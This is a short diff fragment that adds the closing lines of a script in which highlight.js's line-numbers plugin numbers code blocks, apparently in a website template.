+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
